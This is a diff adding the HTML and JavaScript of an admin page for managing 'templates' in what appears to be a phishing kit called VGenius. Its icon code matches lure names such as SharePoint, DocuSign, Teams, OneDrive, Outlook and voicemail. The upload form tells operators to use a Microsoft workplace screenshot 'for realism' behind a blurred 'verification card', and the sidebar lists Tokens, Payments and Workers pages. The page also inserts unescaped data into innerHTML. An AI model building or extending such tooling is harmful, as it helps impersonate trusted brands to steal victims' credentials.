@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Templates Management – VGenius C Engine</title>
+    <link rel="stylesheet" href="assets/css/admin.css">
+    <style>
+        .template-grid-admin {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(300px, 1fr));
+            gap: 20px;
+            margin-bottom: 24px;
+        }
+        .template-card-admin {
+            background: var(--surface);
+            border: 1px solid var(--border);
+            border-radius: 14px;
+            overflow: hidden;
+            transition: all 0.25s;
+            position: relative;
+        }
+        .template-card-admin:hover {
+            border-color: rgba(0,255,102,0.2);
+            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
+        }
+        .template-card-header {
+            height: 140px;
+            background-size: cover;
+            background-position: center;
+            position: relative;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .template-card-header.no-bg {
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 100%);
+        }
+        .template-card-header .overlay {
+            position: absolute;
+            inset: 0;
+            background: rgba(0,0,0,0.4);
+        }
+        .template-card-header .template-icon {
+            position: relative;
+            z-index: 1;
+            font-size: 40px;
+            opacity: 0.8;
+        }
+        .template-card-body {
+            padding: 16px;
+        }
+        .template-card-body h3 {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 13px;
+            font-weight: 700;
+            margin-bottom: 4px;
+            color: var(--text);
+        }
+        .template-meta {
+            display: flex;
+            gap: 12px;
+            font-size: 10px;
+            color: var(--muted);
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0.06em;
+            margin-bottom: 12px;
+        }
+        .template-meta span {
+            padding: 2px 8px;
+            border-radius: 8px;
+        }
+        .meta-preload {
+            background: rgba(0,255,102,0.1);
+            color: var(--accent);
+        }
+        .meta-no-preload {
+            background: rgba(99,102,241,0.1);
+            color: #818cf8;
+        }
+        .meta-active {
+            background: rgba(0,255,102,0.1);
+            color: var(--accent);
+        }
+        .meta-disabled {
+            background: rgba(244,63,94,0.1);
+            color: var(--danger);
+        }
+        .template-actions {
+            display: flex;
+            gap: 6px;
+            flex-wrap: wrap;
+        }
+        .bg-preview-strip {
+            height: 4px;
+            margin-top: 8px;
+            border-radius: 2px;
+            background: linear-gradient(90deg, var(--accent), transparent);
+        }
+        .bg-preview-strip.no-bg-strip {
+            background: rgba(255,255,255,0.05);
+        }
+        .bg-label {
+            font-size: 9px;
+            color: var(--muted);
+            font-family: 'JetBrains Mono', monospace;
+            letter-spacing: 0.06em;
+            margin-top: 4px;
+            text-transform: uppercase;
+        }
+        .modal-lg {
+            max-width: 700px;
+        }
+        .file-drop-zone {
+            border: 2px dashed rgba(255,255,255,0.1);
+            border-radius: 12px;
+            padding: 40px;
+            text-align: center;
+            cursor: pointer;
+            transition: all 0.2s;
+            margin-bottom: 16px;
+        }
+        .file-drop-zone:hover {
+            border-color: var(--accent);
+            background: rgba(0,255,102,0.02);
+        }
+        .file-drop-zone.dragover {
+            border-color: var(--accent);
+            background: rgba(0,255,102,0.06);
+        }
+        .file-drop-zone .icon {
+            font-size: 36px;
+            margin-bottom: 8px;
+        }
+        .file-drop-zone .text {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--muted);
+        }
+        .file-drop-zone .text strong {
+            color: var(--accent);
+        }
+        .file-name-display {
+            font-family: 'JetBrains Mono', monospace;
+            font-size: 11px;
+            color: var(--accent);
+            margin-top: 8px;
+            display: none;
+        }
+        .bg-image-preview {
+            width: 100%;
+            height: 100px;
+            border-radius: 8px;
+            background-size: cover;
+            background-position: center;
+            margin-top: 8px;
+            border: 1px solid var(--border);
+            display: none;
+        }
+    </style>
+</head>
+<body>
+    <div class="app-layout">
+        <aside class="sidebar" id="sidebar">
+            <div class="sidebar-brand">
+                <svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="#00ff66" stroke-width="2"><path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"/></svg>
+                <span>VGENIUS</span>
+            </div>
+            <nav class="sidebar-nav">
+                <a href="dashboard.html" class="nav-item">Dashboard</a>
+                <a href="users.html" class="nav-item">Users</a>
+                <a href="tokens.html" class="nav-item">Tokens</a>
+                <a href="payments.html" class="nav-item">Payments</a>
+                <a href="workers.html" class="nav-item">Workers</a>
+                <a href="templates.html" class="nav-item active">Templates</a>
+                <a href="designs.html" class="nav-item">Verification Designs</a>
+                <a href="settings.html" class="nav-item">Settings</a>
+                <a href="broadcast.html" class="nav-item">Broadcast</a>
+                <a href="feedback.html" class="nav-item">Feedback</a>
+                <a href="auditlog.html" class="nav-item">Audit Log</a>
+            </nav>
+            <div class="sidebar-footer">
+                <button class="btn-logout" onclick="logout()">Logout</button>
+            </div>
+        </aside>
+        <main class="main-content">
+            <div class="header-row">
+                <div>
+                    <h1 class="page-title" style="margin:0;">Templates Management</h1>
+                    <p style="color:var(--muted);font-size:12px;margin-top:4px;">Manage templates. Upload ZIP bundles with HTML, CSS, JS, and config.json.</p>
+                </div>
+                <button class="btn-sm accent" style="padding:12px 20px;font-size:11px;" onclick="openCreateModal()">
+                    + Add Template
+                </button>
+            </div>
+
+            <!-- Stats row -->
+            <div class="stat-grid" style="grid-template-columns:repeat(4,1fr);margin-bottom:24px;">
+                <div class="stat-card">
+                    <div class="stat-value" id="totalCount">—</div>
+                    <div class="stat-label">Total Templates</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="preloadCount">—</div>
+                    <div class="stat-label">Preload</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="noPreloadCount">—</div>
+                    <div class="stat-label">No Preload</div>
+                </div>
+                <div class="stat-card">
+                    <div class="stat-value" id="activeCount">—</div>
+                    <div class="stat-label">Active</div>
+                </div>
+            </div>
+
+            <!-- Template Cards Grid -->
+            <div class="template-grid-admin" id="templateGrid">
+                <div class="empty-state" style="grid-column:1/-1;">Loading templates...</div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Create/Edit Modal -->
+    <div class="modal-overlay" id="templateModal" style="display:none;" onclick="if(event.target===this)closeModal()">
+        <div class="modal-card modal-lg">
+            <div class="modal-header">
+                <span class="modal-title" id="modalTitle">Add Template</span>
+                <button class="modal-close" onclick="closeModal()">×</button>
+            </div>
+            <form id="templateForm" enctype="multipart/form-data">
+                <input type="hidden" id="templateId" value="">
+                
+                <div class="form-group">
+                    <label>Template Name</label>
+                    <input type="text" id="templateName" placeholder="e.g., SharePoint 5" required>
+                </div>
+                
+                <div class="form-group">
+                    <label>Category</label>
+                    <select id="templateCategory" required>
+                        <option value="preload">Preload (Document Info — File Name, Pages)</option>
+                        <option value="no_preload">No Preload (Custom Text — Title, Message)</option>
+                    </select>
+                    <div style="font-size:10px;color:var(--muted);margin-top:4px;">
+                        Preload templates show a document card with file name and page count. No-preload templates show custom title and message text.
+                    </div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Template Files (ZIP)</label>
+                    <div class="file-drop-zone" id="zipDropZone" onclick="document.getElementById('zipFileInput').click()">
+                        <div class="icon">📦</div>
+                        <div class="text">Drop ZIP file here or <strong>browse</strong></div>
+                        <div class="text" style="font-size:10px;margin-top:4px;">Must contain: index.html, style.css, script.js, config.json</div>
+                    </div>
+                    <input type="file" id="zipFileInput" accept=".zip" style="display:none;" onchange="handleZipSelect(event)">
+                    <div class="file-name-display" id="zipFileName"></div>
+                </div>
+                
+                <div class="form-group">
+                    <label>Background Image</label>
+                    <div style="font-size:10px;color:var(--muted);margin-bottom:8px;">
+                        This image sits behind the verification card. It gets blurred during link creation. Use a screenshot of a Microsoft workplace (office cubicle, Teams grid, OneDrive browser) for realism.
+                    </div>
+                    <input type="file" id="bgImageInput" accept=".jpg,.jpeg,.png,.webp" onchange="handleBgSelect(event)">
+                    <div class="file-name-display" id="bgFileName"></div>
+                    <div class="bg-image-preview" id="bgPreview"></div>
+                </div>
+
+                <div class="form-group" style="display:flex;gap:8px;">
+                    <button type="button" class="btn-sm accent" style="flex:1;padding:14px;" onclick="saveTemplate()" id="saveBtn">
+                        Create Template
+                    </button>
+                    <button type="button" class="btn-sm" style="flex:1;padding:14px;" onclick="closeModal()">
+                        Cancel
+                    </button>
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script src="assets/js/admin.js"></script>
+    <script>
+        if (!localStorage.getItem('vg-admin-token')) window.location.href = 'index.html';
+        
+        let editingId = null;
+        let selectedZipFile = null;
+        let selectedBgFile = null;
+
+        // --- Load Templates ---
+        async function loadTemplates() {
+            try {
+                const res = await fetch('/api/admin/templates', { headers: adminHeaders() });
+                const templates = await res.json();
+                
+                // Stats
+                const preload = templates.filter(t => t.category === 'preload' && t.status === 'active');
+                const noPreload = templates.filter(t => t.category === 'no_preload' && t.status === 'active');
+                const active = templates.filter(t => t.status === 'active');
+                
+                document.getElementById('totalCount').textContent = templates.length;
+                document.getElementById('preloadCount').textContent = preload.length;
+                document.getElementById('noPreloadCount').textContent = noPreload.length;
+                document.getElementById('activeCount').textContent = active.length;
+                
+                // Grid
+                const grid = document.getElementById('templateGrid');
+                if (!templates.length) {
+                    grid.innerHTML = '<div class="empty-state" style="grid-column:1/-1;">No templates. Click "Add Template" to upload your first template.</div>';
+                    return;
+                }
+                
+                grid.innerHTML = templates.map(t => {
+                    const config = t.config_json ? JSON.parse(t.config_json) : {};
+                    const hasBg = config.background && config.background.default;
+                    const bgStyle = hasBg 
+                        ? `background-image:url('/templates/${t.name.toLowerCase().replace(/[^a-z0-9]+/g,'-')}/${config.background.default}');background-size:cover;`
+                        : '';
+                    
+                    return `
+                    <div class="template-card-admin">
+                        <div class="template-card-header ${!hasBg ? 'no-bg' : ''}" style="${bgStyle}">
+                            ${!hasBg ? '<div class="overlay"></div>' : '<div class="overlay" style="background:rgba(0,0,0,0.3);"></div>'}
+                            <div class="template-icon">${getTemplateIcon(t.name)}</div>
+                        </div>
+                        <div class="template-card-body">
+                            <h3>${t.name}</h3>
+                            <div class="template-meta">
+                                <span class="meta-${t.category === 'preload' ? 'preload' : 'no-preload'}">${t.category === 'preload' ? 'PRELOAD' : 'NO PRELOAD'}</span>
+                                <span class="meta-${t.status === 'active' ? 'active' : 'disabled'}">${t.status.toUpperCase()}</span>
+                                <span>v${t.version || '1.0.0'}</span>
+                            </div>
+                            <div class="bg-preview-strip ${!hasBg ? 'no-bg-strip' : ''}"></div>
+                            <div class="bg-label">Background: ${hasBg ? config.background.default : 'None (will show solid color)'}</div>
+                            <div class="template-actions" style="margin-top:12px;">
+                                <button class="btn-sm" onclick="openEditModal(${t.id})">Edit</button>
+                                <button class="btn-sm" onclick="uploadBackground(${t.id})">Upload BG</button>
+                                <button class="btn-sm" onclick="downloadTemplate(${t.id})">Download</button>
+                                <button class="btn-sm danger" onclick="deleteTemplate(${t.id}, '${t.name}')">Delete</button>
+                            </div>
+                        </div>
+                    </div>`;
+                }).join('');
+            } catch (err) {
+                console.error('Load templates error:', err);
+                document.getElementById('templateGrid').innerHTML = '<div class="empty-state" style="grid-column:1/-1;">Failed to load templates.</div>';
+            }
+        }
+
+        function getTemplateIcon(name) {
+            const n = name.toLowerCase();
+            if (n.includes('sharepoint')) return '📋';
+            if (n.includes('docusign')) return '💰';
+            if (n.includes('adobe')) return '🎨';
+            if (n.includes('teams')) return '💜';
+            if (n.includes('onedrive')) return '☁';
+            if (n.includes('zoom')) return '📹';
+            if (n.includes('excel')) return '📊';
+            if (n.includes('word')) return '📝';
+            if (n.includes('outlook')) return '📧';
+            if (n.includes('ringcentral')) return '📞';
+            if (n.includes('voicemail')) return '📱';
+            return '🔐';
+        }
+
+        // --- Modal Handlers ---
+        function openCreateModal() {
+            editingId = null;
+            selectedZipFile = null;
+            selectedBgFile = null;
+            document.getElementById('modalTitle').textContent = 'Add Template';
+            document.getElementById('saveBtn').textContent = 'Create Template';
+            document.getElementById('templateId').value = '';
+            document.getElementById('templateName').value = '';
+            document.getElementById('templateCategory').value = 'preload';
+            document.getElementById('zipFileName').style.display = 'none';
+            document.getElementById('bgFileName').style.display = 'none';
+            document.getElementById('bgPreview').style.display = 'none';
+            document.getElementById('zipFileInput').value = '';
+            document.getElementById('bgImageInput').value = '';
+            document.getElementById('templateModal').style.display = 'flex';
+        }
+
+        async function openEditModal(id) {
+            editingId = id;
+            selectedZipFile = null;
+            selectedBgFile = null;
+            document.getElementById('modalTitle').textContent = 'Edit Template';
+            document.getElementById('saveBtn').textContent = 'Update Template';
+            document.getElementById('templateId').value = id;
+            document.getElementById('zipFileName').style.display = 'none';
+            document.getElementById('bgFileName').style.display = 'none';
+            document.getElementById('bgPreview').style.display = 'none';
+            document.getElementById('zipFileInput').value = '';
+            document.getElementById('bgImageInput').value = '';
+            
+            try {
+                const res = await fetch(`/api/admin/templates/${id}`, { headers: adminHeaders() });
+                const t = await res.json();
+                document.getElementById('templateName').value = t.name;
+                document.getElementById('templateCategory').value = t.category;
+                
+                const config = t.config_json ? JSON.parse(t.config_json) : {};
+                if (config.background && config.background.default) {
+                    const bgPath = `/templates/${t.name.toLowerCase().replace(/[^a-z0-9]+/g,'-')}/${config.background.default}`;
+                    document.getElementById('bgPreview').style.backgroundImage = `url(${bgPath})`;
+                    document.getElementById('bgPreview').style.display = 'block';
+                }
+                
+                document.getElementById('templateModal').style.display = 'flex';
+            } catch (err) {
+                showToast('Failed to load template', true);
+            }
+        }
+
+        function closeModal() {
+            document.getElementById('templateModal').style.display = 'none';
+            editingId = null;
+            selectedZipFile = null;
+            selectedBgFile = null;
+        }
+
+        // --- File Handlers ---
+        function handleZipSelect(event) {
+            const file = event.target.files[0];
+            if (file) {
+                selectedZipFile = file;
+                const display = document.getElementById('zipFileName');
+                display.textContent = `✓ ${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
+                display.style.display = 'block';
+            }
+        }
+
+        function handleBgSelect(event) {
+            const file = event.target.files[0];
+            if (file) {
+                selectedBgFile = file;
+                const display = document.getElementById('bgFileName');
+                display.textContent = `✓ ${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
+                display.style.display = 'block';
+                
+                // Preview
+                const reader = new FileReader();
+                reader.onload = (e) => {
+                    const preview = document.getElementById('bgPreview');
+                    preview.style.backgroundImage = `url(${e.target.result})`;
+                    preview.style.display = 'block';
+                };
+                reader.readAsDataURL(file);
+            }
+        }
+
+        // Drag and drop for ZIP
+        const dropZone = document.getElementById('zipDropZone');
+        if (dropZone) {
+            dropZone.addEventListener('dragover', (e) => {
+                e.preventDefault();
+                dropZone.classList.add('dragover');
+            });
+            dropZone.addEventListener('dragleave', () => {
+                dropZone.classList.remove('dragover');
+            });
+            dropZone.addEventListener('drop', (e) => {
+                e.preventDefault();
+                dropZone.classList.remove('dragover');
+                const file = e.dataTransfer.files[0];
+                if (file && (file.type === 'application/zip' || file.name.endsWith('.zip'))) {
+                    selectedZipFile = file;
+                    document.getElementById('zipFileName').textContent = `✓ ${file.name} (${(file.size / 1024).toFixed(1)} KB)`;
+                    document.getElementById('zipFileName').style.display = 'block';
+                }
+            });
+        }
+
+        // --- Save ---
+        async function saveTemplate() {
+            const name = document.getElementById('templateName').value.trim();
+            const category = document.getElementById('templateCategory').value;
+            
+            if (!name) return showToast('Template name required', true);
+            if (!editingId && !selectedZipFile) return showToast('ZIP file required for new templates', true);
+            
+            const formData = new FormData();
+            formData.append('name', name);
+            formData.append('category', category);
+            
+            if (selectedZipFile) {
+                formData.append('zip_file', selectedZipFile);
+            }
+            
+            if (selectedBgFile) {
+                formData.append('background', selectedBgFile);
+            }
+            
+            const url = editingId 
+                ? `/api/admin/templates/${editingId}` 
+                : '/api/admin/templates';
+            const method = editingId ? 'PUT' : 'POST';
+            
+            try {
+                const res = await fetch(url, {
+                    method,
+                    headers: { 'Authorization': `Bearer ${localStorage.getItem('vg-admin-token')}` },
+                    body: formData,
+                });
+                
+                const data = await res.json();
+                if (data.id || data.success) {
+                    showToast(editingId ? 'Template updated' : 'Template created');
+                    
+                    // If background image was uploaded and it's a new template, upload it separately
+                    if (selectedBgFile && data.id && !editingId) {
+                        const bgFormData = new FormData();
+                        bgFormData.append('background', selectedBgFile);
+                        await fetch(`/api/admin/templates/${data.id}/background`, {
+                            method: 'POST',
+                            headers: { 'Authorization': `Bearer ${localStorage.getItem('vg-admin-token')}` },
+                            body: bgFormData,
+                        });
+                    }
+                    
+                    closeModal();
+                    loadTemplates();
+                } else {
+                    showToast(data.error || 'Failed to save template', true);
+                }
+            } catch (err) {
+                showToast('Network error: ' + err.message, true);
+            }
+        }
+
+        // --- Upload Background ---
+        async function uploadBackground(id) {
+            const input = document.createElement('input');
+            input.type = 'file';
+            input.accept = '.jpg,.jpeg,.png,.webp';
+            input.onchange = async (e) => {
+                const file = e.target.files[0];
+                if (!file) return;
+                
+                const formData = new FormData();
+                formData.append('background', file);
+                
+                try {
+                    const res = await fetch(`/api/admin/templates/${id}/background`, {
+                        method: 'POST',
+                        headers: { 'Authorization': `Bearer ${localStorage.getItem('vg-admin-token')}` },
+                        body: formData,
+                    });
+                    const data = await res.json();
+                    if (data.success) {
+                        showToast(`Background image uploaded: ${data.background}`);
+                        loadTemplates();
+                    } else {
+                        showToast(data.error || 'Upload failed', true);
+                    }
+                } catch (err) {
+                    showToast('Upload error', true);
+                }
+            };
+            input.click();
+        }
+
+        // --- Download ---
+        function downloadTemplate(id) {
+            window.open(`/api/admin/templates/${id}/download`, '_blank');
+        }
+
+        // --- Delete ---
+        async function deleteTemplate(id, name) {
+            if (!confirm(`Delete template "${name}"? It will be soft-disabled and existing links will continue working with the cached version.`)) return;
+            try {
+                await fetch(`/api/admin/templates/${id}`, {
+                    method: 'DELETE',
+                    headers: adminHeaders(),
+                });
+                showToast('Template disabled');
+                loadTemplates();
+            } catch (err) {
+                showToast('Delete failed', true);
+            }
+        }
+
+        // --- Init ---
+        document.addEventListener('keydown', (e) => {
+            if (e.key === 'Escape') closeModal();
+        });
+        
+        loadTemplates();
+    </script>
+</body>
+</html>
